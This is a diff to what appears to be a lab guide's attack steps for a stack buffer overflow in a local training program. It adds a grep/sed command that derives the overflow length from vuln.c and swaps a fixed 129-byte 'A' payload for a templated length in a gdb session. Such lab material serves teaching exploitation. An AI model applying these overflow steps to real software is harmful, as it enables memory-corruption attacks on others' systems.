@@ -20,6 +20,12 @@
 
 ## ATTACK
 
+1. Compute the length of the string that will be passed to the vulnerable program
+
+    ```bash
+    echo $(($(grep -e "+[0-9]" $HOME/bof/vuln.c | sed 's/.*+\([0-9]\+\)\].*/\1/')/16*16 + 97))
+    ```
+
 1. Navigate to ./bof and run ./runner under gdb
 
     ```bash
@@ -34,7 +40,7 @@
     unset env COLUMNS
     b 24
     y
-    r `perl -e 'print "A" x 129'`
+    r `perl -e 'print "A" x {string_length}'`
     p/x $esp
     ```
 
